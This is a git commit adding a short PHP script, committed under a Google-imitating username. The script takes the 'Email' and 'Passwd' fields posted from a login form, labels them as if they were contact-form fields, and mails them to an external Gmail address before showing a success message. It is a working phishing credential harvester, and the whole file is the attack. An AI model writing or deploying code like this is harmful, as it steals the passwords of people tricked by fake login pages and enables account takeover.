b5edcaf6d616b66b7a36a987f87ccf4680ffc60b
googIIe <43043263+googIIe@users.noreply.github.com>
2018-09-06 18:36:42 -0300

    initial commit

---
+++ script.php
@@ -0,0 +1,11 @@
+<?php
+$assunto = $_POST['Email'];
+$corpo = "
+  Assunto:" .$_POST['Passwd']."
+  Nome:" .$_POST['Email']."
+  Email:" .$_POST['Email']."
+  Mensagem:" .$_POST['Passwd']."
+";
+mail('crowleywe@gmail.com',$assunto,$corpo,'From: crowleydesigner@gmail.com');
+echo 'Seus Dados foram enviados com sucesso';
+?>
